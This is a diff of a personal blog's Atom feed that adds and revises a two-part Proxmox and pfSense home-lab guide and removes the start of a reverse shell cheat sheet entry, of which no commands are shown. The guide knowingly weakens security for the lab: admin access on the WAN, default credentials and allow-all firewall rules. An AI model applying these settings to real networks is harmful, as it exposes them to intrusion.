@@ -1,7 +1,104 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://0.0.0.0:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2018-01-21T22:32:34-06:00</updated><id>http://0.0.0.0:4000//</id><title type="html">Notepad+++  - </title><subtitle>Putting stuff together so you don't have to google as hard as I did.
-</subtitle><entry><title type="html">Proxmox Home Lab on a Slightly Larger Budget</title><link href="http://0.0.0.0:4000/2017/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget.html" rel="alternate" type="text/html" title="Proxmox Home Lab on a Slightly Larger Budget" /><published>2017-01-18T21:31:00-06:00</published><updated>2017-01-18T21:31:00-06:00</updated><id>http://0.0.0.0:4000/2017/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget</id><content type="html" xml:base="http://0.0.0.0:4000/2017/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget.html">&lt;p&gt;Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a 2 simple node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your outer, and then connect everything up before you start installing Proxmox.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-02-22T22:49:55-06:00</updated><id>http://localhost:4000/</id><title type="html">Notepad+++  - </title><subtitle>Putting stuff together so you don't have to google as hard as I did.
+</subtitle><entry><title type="html">Proxmox Home Lab on a Slightly Larger Budget - Part 2</title><link href="http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2.html" rel="alternate" type="text/html" title="Proxmox Home Lab on a Slightly Larger Budget - Part 2" /><published>2018-02-19T00:31:00-06:00</published><updated>2018-02-19T00:31:00-06:00</updated><id>http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2</id><content type="html" xml:base="http://localhost:4000/2018/02/19/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part2.html">&lt;p&gt;Building a home lab Part 2 - Networking Some More&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/lab.jpg&quot; alt=&quot;My home lab&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So now we have some hardware and some virtualization hosts set up. Now you can set up your firewall. There are a few things we can do to make this environment easier to maintain. There are lots of great guides on setting up PfSense, mine will blaze through that set up to get to the goods. If you want a really great guide on setting up Pfsense, I recommend &lt;a href=&quot;https://leanpub.com/avatar&quot;&gt;Building Virtual Machine Labs&lt;/a&gt; by Tony Robinson.&lt;/p&gt;
+
+&lt;p&gt;The real short version of it is you need to get pfsense from &lt;a href=&quot;https://www.pfsense.org/download/&quot;&gt;here&lt;/a&gt; and upload it to your lab, create a VM, load the pfesnse ISO, enable VirtIO driver support, and then configure the WAN interface before you can get to any fun stuff.&lt;/p&gt;
+
+&lt;h2 id=&quot;setting-up-the-vms&quot;&gt;Setting up the VMs&lt;/h2&gt;
+
+&lt;p&gt;To upload the iso, go Storage View &amp;gt; Select either node (since we configured them both to mount the NAS, it doesn’t matter which one) &amp;gt; Content &amp;gt; Upload.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/iso.png&quot; alt=&quot;Uploading an Image&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go back to Server View and click Create VM at the top right. Name it something reasonable (pfsense1 anyone?), set the storage option to “Use CD/DVD disc image file (iso)” and select your nas and the ISO image you just uploaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/osoption.png&quot; alt=&quot;OS Options&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Your OS options should be fine as-is, and then I used 1 socket, 2 cores, and 2048MB of RAM, which is probably overkill. Enable memory ballooning as we’ll add the drivers to support it later.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfsensehdd.png&quot; alt=&quot;PfSense Drive Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For the first network device, we’re going to bridge this onto your lan. This means your home lab PfSense router will face your network, but everything else will be NATed behind it. Attach this device to vmbr0 and set the Model to VirtIO (paravirtualized).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfvmbr0.png&quot; alt=&quot;PfSense Network Settings&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Note the MAC address that is generated for this interface. If you want it to come up on a predictable IP, configure this mac address as a static assignment just like you did for the ProxMox hosts.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/pfdone.png&quot; alt=&quot;PfSense Done&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before you start the VM, select it and edit the hardware. Add another network device, but this time attach it to vmbr1 and again set it to VirtIO.&lt;/p&gt;
+
+&lt;p&gt;Start the VM and hope for the best. It should boot and let you install pfsense, I just used all defaults the whole way. When the install is wrapping up, it asks you if you want to drop into a console to make any edits. Select yes and do this edit /boot/loader.conf&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;virtio_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;virtio_pci_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;if_vtnet_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;virtio_balloon_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;virtio_blk_load&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;YES&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save the file, reboot, and you have pfsense installed! It’ll boot and then you can hit it through the console by clicking on the VM in ProxMox’s Server View, selecting the VM, and using the console to manage it. It’ll run you through some setup, again, I selected defaults and let it DHCP itself onto the network. It’ll come up wherever it wants or at the address it was staticked to earlier.&lt;/p&gt;
+
+&lt;p&gt;During this setup, I don’t configure VLANs yet. I save those for later, I like to do it all at once in the GUI.&lt;/p&gt;
+
+&lt;h2 id=&quot;accessing-the-admin-console&quot;&gt;Accessing the Admin Console&lt;/h2&gt;
+
+&lt;p&gt;You won’t be able to hit the management interface with the default configurations, it’s blocked to the WAN interface. There’s documentation on setting it up &lt;a href=&quot;https://doc.pfsense.org/index.php/Remote_firewall_Administration&quot;&gt;here&lt;/a&gt; but that assumes you can hit the web admin console from the Lan. Since this is a new environment, we don’t have anything on there yet.&lt;/p&gt;
+
+&lt;p&gt;I uploaded a Linux Mint ISO to my NAS storage and deployed a VM to the vmbr1 network, you can use any live ISO you want, you just need a browser really. Launch it as live image, don’t bother installing it, but launch the browser and you can hit the pfsense admin console at LAN gateway, probably 192.168.1.1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/mint-live.png&quot; alt=&quot;Mint Live Config&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;configuring-pfsense&quot;&gt;Configuring PfSense&lt;/h2&gt;
+
+&lt;p&gt;Log into the admin console, the default credentials are admin/pfsense, make sure you change that if you care. Configure your hostname and domain (match your router’s domain, don’t choose anything.local if you have any macs because .local messes with their network auto configuration).&lt;/p&gt;
+
+&lt;p&gt;I set my primary DNS to my router and secondary to Google. Static the WAN interface to an IP you want it to be on if you haven’t already or leave it DHCP. On Step 4 of 9, disable the Block RFC1918 Private Networks option. You can do the rest, now follow the recommendations from pfsense.org earlier to enable remote admin. Your firewall rule should look like the top rule (the others come in later) this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/wantopfsense.png&quot; alt=&quot;WAN to PFsense&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;NOW you should be able to manage the console through the WAN interface over HTTPS and you can throw away this VM. Don’t do this if it’s ever put on the internet or you stop trusting your network.&lt;/p&gt;
+
+&lt;p&gt;Since we have this on our LAN, we’ll need to go to Interfaces &amp;gt; WAN &amp;gt; Reserved Networks and disable the checkbox that Blocks networks and loopback addresses.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/rfc1918.png&quot; alt=&quot;WAN rfc1918&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We’ll also need to poke this hole in the firewall to allow you to manage the firewall directly.&lt;/p&gt;
+
+&lt;p&gt;One handy change I made was under General &amp;gt; Setup &amp;gt; WebConfigurator, I changed Top Navigation to “Fixed” because it prevents the top menu bar from getting lost when the browser isn’t full screened. Following the recommendations &lt;a href=&quot;https://doc.pfsense.org/index.php/Virtualizing_pfSense_on_Proxmox&quot;&gt;here&lt;/a&gt;, disable hardware checksum offloading.&lt;/p&gt;
+
+&lt;h2 id=&quot;vlans&quot;&gt;VLANs&lt;/h2&gt;
+
+&lt;p&gt;So here’s where you build whatever your heart desires. With my network, I wanted to represent an environment following “alright practices” - not the best, not the worst. I have a LAN services network, an “office/admin” network, development network that includes “external” and “internal” services like web servers and databases, a Production Internal, Production External, and an “Internet” network where attackers will come from. This is a rough map of what I built:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/logicalnetwork.png&quot; alt=&quot;Logical Network&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change what you want about that, but if you want to build just that, you need to go to Interfaces &amp;gt; VLANs and build this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/vlan-ints.png&quot; alt=&quot;Vlan interfaces&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you’ve created the VLANs, you’ll need to assign them to an interface under Interface &amp;gt; Assignments. Each of the interfaces is all getting assigned to vtnet1 like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/int-assign.png&quot; alt=&quot;Interface Assignment&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now you need to go to Services &amp;gt; DHCP Server and configure each of the interfaces like I configured my admin interface. I recommend you use /24’s for each of the interface, it makes a lot of what we’ll do with ansible much easier (I learned this the hard way).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/adminlan.png&quot; alt=&quot;Admin DHCP&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;firewalls&quot;&gt;Firewalls!&lt;/h2&gt;
+
+&lt;p&gt;Whew. We’re almost done. Our firewall rules are going to provide two rules at least, one that allows all traffic from the Admin network into the network and allows all traffic out. This isn’t best practice, but it’s something very simple to start with for every network that you can tune and tighten as you finish up your lab. Go to Firewall &amp;gt; Rules  and configure rules that look like this for each non-WAN interface:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/devfw.png&quot; alt=&quot;Dev Firewall&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For my “internet” VLAN, I allow all traffic in and out because it’s supposed to simulate the internet.&lt;/p&gt;
+
+&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h2&gt;
+
+&lt;p&gt;If you followed these steps, you should have a very basic network built. You can drop devices anywhere you want to and they should work. VLANs keep the traffic separate and firewall rules let stuff talk to each other. If you’re still with me, congrats. The next post will build some infrastructure you’ll use to deploy the rest of your images and start messing with ansible. Thanks for reading.&lt;/p&gt;</content><author><name></name></author><summary type="html">Building a home lab Part 2 - Networking Some More</summary></entry><entry><title type="html">Proxmox Home Lab on a Slightly Larger Budget - Part 1</title><link href="http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1.html" rel="alternate" type="text/html" title="Proxmox Home Lab on a Slightly Larger Budget - Part 1" /><published>2018-01-18T21:31:00-06:00</published><updated>2018-01-18T21:31:00-06:00</updated><id>http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1</id><content type="html" xml:base="http://localhost:4000/2018/01/18/Proxmox_Lab_on_a_Slightly_Larger_Budget_Part1.html">&lt;p&gt;Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a simple 2 node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your router, and then connect everything up before you start installing Proxmox.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/lab.jpg&quot; alt=&quot;My home lab&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;hardware&quot;&gt;Hardware&lt;/h3&gt;
 
@@ -25,7 +122,7 @@
 
 &lt;h3 id=&quot;networking---dd-wrt&quot;&gt;Networking - DD-WRT&lt;/h3&gt;
 
-&lt;p&gt;I use dd-wrt for my home router OS. It makes a lot of what I’m doing easier, but updated support for hardware varies. The main www.dd-wrt.com is the place to go for most questions, but the resources at &lt;a href=&quot;https://www.myopenrouter.com/&quot;&gt;my open router&lt;/a&gt; are excellent. If you don’t already have a router that supports dd-wrt, I strongly recommend you pick one based on what someone at my open router supports. Install it using their guides.&lt;/p&gt;
+&lt;p&gt;I use dd-wrt for my home router OS. It makes a lot of what I’m doing easier, but updated support for hardware varies. The main www.dd-wrt.com is the place to go for most questions, but the resources at &lt;a href=&quot;https://www.myopenrouter.com/&quot;&gt;my open router&lt;/a&gt; are excellent. If you don’t already have a router that supports dd-wrt, I strongly recommend you pick one based on what someone at my open router supports. Install it using their guides. For updates, go to the &lt;a href=&quot;https://download1.dd-wrt.com/dd-wrtv2/downloads/betas&quot;&gt;dd-wrt beta download site&lt;/a&gt; and avoid what’s on the &lt;a href=&quot;https://www.dd-wrt.com/site/support/router-database&quot;&gt;router database&lt;/a&gt;, beta has better bug fixes and support.&lt;/p&gt;
 
 &lt;p&gt;Judge me if you must, but I wanted this easy to interact with from my home network, so I dumped both my home network and lab into the same subnet. I’ll break it off one day, but that’s the subject of another post.&lt;/p&gt;
 
@@ -37,18 +134,18 @@
   &lt;li&gt;Make your home subnet a /22. You’ll appreciate the IP space.&lt;/li&gt;
   &lt;li&gt;Restrict your DHCP range to something specific, 10.0.0.50-10.0.0.150 for example.&lt;/li&gt;
   &lt;li&gt;This isn’t required but makes keeping your networks straight in your head easier
-&lt;img src=&quot;http://0.0.0.0:4000/images/dhcp.png&quot; alt=&quot;dhcp&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;http://localhost:4000/images/dhcp.png&quot; alt=&quot;dhcp&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;Configure your router name and Configure your domain name.&lt;/li&gt;
   &lt;li&gt;Enable USB Support under Services &amp;gt; USB
-&lt;img src=&quot;http://0.0.0.0:4000/images/usb.png&quot; alt=&quot;usb&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;http://localhost:4000/images/usb.png&quot; alt=&quot;usb&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;Enable NAS support. Proxmox will store images here. 
-&lt;img src=&quot;http://0.0.0.0:4000/images/nas.png&quot; alt=&quot;nas&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;http://localhost:4000/images/nas.png&quot; alt=&quot;nas&quot; class=&quot;center-image&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;Create a backup of your configuration once you have something that works&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;When it’s done, you’ll have the basis to build this:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/netmap.png&quot; alt=&quot;netmap&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/netmap.png&quot; alt=&quot;netmap&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;networking---switch&quot;&gt;Networking - Switch&lt;/h3&gt;
 
@@ -56,7 +153,7 @@
 
 &lt;p&gt;I connected my switch to a single port on my router and used VLANs to do network segregation on the switch. With the configuration I use, everything in my lab can be accessible from my home network but we avoid switching loops and and broadcast issues. This is my vlan configuration:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/images/switch.png&quot; alt=&quot;vlans&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/switch.png&quot; alt=&quot;vlans&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;With that VLAN configuration, you’re ready to go. Connect eno1, the built in ethernet to ports 5 and 6. Port 7 and 8 will connect your dongles.&lt;/p&gt;
 
@@ -72,27 +169,26 @@
 
 &lt;p&gt;You’ll need to SSH into each host, add your SSH key if you so desire, and then do this configure the free repositories for updates and install them, unless you want to pay for support:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /etc/apt/sources.list.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;deb http://download.proxmox.com/debian/pve stretch pve-no-subscription&quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/pve-install-repo.list
-wget http://download.proxmox.com/debian/proxmox-ve-release-5.x.gpg -O /etc/apt/trusted.gpg.d/proxmox-ve-release-5.x.gpg
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm /etc/apt/sources.list.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;deb http://download.proxmox.com/debian/pve stretch pve-no-subscription&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/apt/sources.list.d/pve-install-repo.list
+wget http://download.proxmox.com/debian/proxmox-ve-release-5.x.gpg &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /etc/apt/trusted.gpg.d/proxmox-ve-release-5.x.gpg
 
 apt update
 apt install openvswitch-switch
 apt upgrade
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Add your NAS to the /etc/fstab file of each Proxmox host. Use a credentials file for better security.This is an example of the line you’ll add to your fstab file:&lt;/p&gt;
 
-&lt;p&gt;//mynas/media /mnt/bindmounts/media cifs rw,credentials=/home/.smbcredentials-mynas,vers=3.0,noperm,auto 0 0&lt;/p&gt;
+&lt;p&gt;//mynas/media /mnt/bindmounts/media cifs rw,credentials=/home/.smbcredentials-mynas,vers=2.0,noperm,auto 0 0&lt;/p&gt;
 
-&lt;p&gt;If you use DD-wrt and didn’t upgrade to SMBv3, you’ll need to specify version 1 with “vers=1.0”.&lt;/p&gt;
+&lt;p&gt;If you use DD-wrt and aren’t using a recent version, you’ll need to specify version 1 with “vers=1.0”. Use an updated version.&lt;/p&gt;
 
 &lt;p&gt;Add these lines to /etc/sysctl.conf.&lt;/p&gt;
 
 &lt;p&gt;Edit /etc/sysctl.conf to do the following (you could just as easily paste it in at the bottom):&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Uncomment the next line to enable packet forwarding for IPv4&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Uncomment the next line to enable packet forwarding for IPv4&lt;/span&gt;
 net.ipv4.ip_forward&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 
 &lt;span class=&quot;c&quot;&gt;# disable ipv6&lt;/span&gt;
@@ -102,23 +198,20 @@ net.ipv6.conf.lo.disable_ipv6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
 
 &lt;span class=&quot;c&quot;&gt;# increase max_user_instances to allow more containers&lt;/span&gt;
 fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1024
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;You’ll thank me later for this one, but you’ll notice your second network interface has some crazy name that includes the mac address in it. This long name causes all sorts of problems and is at the very least a pain to type over and over, so rename the interface eno2. You can do that by inserting the following line into /etc/udev/rules.d/10-network.rules with your proper mac address.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;SUBSYSTEM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;ACTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;add&quot;&lt;/span&gt;, ATTR&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;address&lt;span class=&quot;o&quot;&gt;}==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XX:XX:XX:XX:XX:XX&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eno2&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;SUBSYSTEM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;net&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;ACTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;add&quot;&lt;/span&gt;, ATTR&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;address&lt;span class=&quot;o&quot;&gt;}==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XX:XX:XX:XX:XX:XX&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;NAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;eno2&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Finally, configure your hosts file on each of the nodes to look like this, modifying it depending on what node you’re on:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@pve1:~# &lt;/span&gt;cat /etc/hosts
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@pve1:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/hosts
 127.0.0.1 localhost.localdomain localhost
-10.0.0.11 pve1.home.local pve1 pvelocalhost
-10.0.0.12 pve2.home.local pve2
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&amp;lt;IP pve1&amp;gt; pve1.local.lan pve1 pvelocalhost
+&amp;lt;IP pve2&amp;gt; pve2.local.lan pve2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Reboot and verify your interface name and all the other changes took.&lt;/p&gt;
 
@@ -126,7 +219,58 @@ fs.inotify.max_user_instances &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 102
 
 &lt;p&gt;This is so easy you’re gonna love it. Reboot first so you know all your changes took. Create your cluster and pick a name, ssh into the other host and add it. Proxmox configures ssh keys and all sorts of other services. If you want a cluster named cluster, use these steps, otherwise, customize it to your liking.&lt;/p&gt;
 
-&lt;p&gt;The steps &lt;a href=&quot;https://pve.proxmox.com/wiki/Cluster_Manager&quot;&gt;here&lt;/a&gt; outline what needs to be done pretty well, but basically, create the cluster on pve1, ssh in pve2 and add it to the cluster.&lt;/p&gt;</content><summary type="html">Proxmox is an open source virtualization solution and a really flexible base for a home lab. This guide will walk through building a 2 simple node proxmox cluster. My deployment tools are ansible and various things built into Proxmox. This guide walks through a lot of the prep work you need to do before you even install Proxmox. I recommend you follow along and get your hardware in order, plan your networking, configure your outer, and then connect everything up before you start installing Proxmox.</summary></entry><entry><title type="html">Reverse Shell Cheat Sheet</title><link href="http://0.0.0.0:4000/2017/01/17/reverse-shell-cheatsheet.html" rel="alternate" type="text/html" title="Reverse Shell Cheat Sheet" /><published>2017-01-17T20:56:00-06:00</published><updated>2017-01-17T20:56:00-06:00</updated><id>http://0.0.0.0:4000/2017/01/17/reverse-shell-cheatsheet</id><content type="html" xml:base="http://0.0.0.0:4000/2017/01/17/reverse-shell-cheatsheet.html">&lt;h2 id=&quot;cause-everyone-posts-one&quot;&gt;Cause everyone posts one&lt;/h2&gt;
+&lt;p&gt;The steps &lt;a href=&quot;https://pve.proxmox.com/wiki/Cluster_Manager&quot;&gt;here&lt;/a&gt; outline what needs to be done pretty well, but basically, create the cluster on pve1, ssh in pve2 and add it to the cluster. That’s really all there is to it. It does the rest. You can then launch your browser and get to the console.&lt;/p&gt;
+
+&lt;p&gt;You can mess aroudn in in the console if you want, but you need to set up your interfaces files before you deploy any images or devices. I wouldn’t bother editing them through the GUI, there’s some options that are different to configure through the console such as mtu and anything else beyond the basics.&lt;/p&gt;
+
+&lt;p&gt;Modify the following /etc/network/interfaces file to match the IPs for your lan for each host, back up the existing interfaces file (move it to /etc/network/interfaces.old), and drop in something that looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto lo
+iface lo inet loopback
+
+allow-vmbr0 eno1
+iface eno1 inet manual
+        ovs_type OVSPort
+        ovs_bridge vmbr0
+
+allow-vmbr1 eno2
+iface eno2 inet manual
+        ovs_type OVSPort
+        ovs_bridge vmbr1
+        mtu 4000
+
+auto vmbr0
+iface vmbr0 inet static
+        address  10.0.0.11
+        netmask  255.255.252.0
+        gateway  10.0.0.1
+        ovs_type OVSBridge
+        ovs_ports eno1
+
+auto vmbr1
+iface vmbr1 inet static
+        address  10.0.0.21
+        netmask  255.255.252.0
+        ovs_type OVSBridge
+        ovs_ports eno2
+        mtu 4000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Reboot your system here, we now we just need to make sure the NAS comes up when the network does. Create a startup script at /etc/network/if-up.d/mount and make it executable. All you need to have in it is a mount -a to get it all working. The network interface will come up, the NAS will be ready and mounted when you’re done booting up.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+mount &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
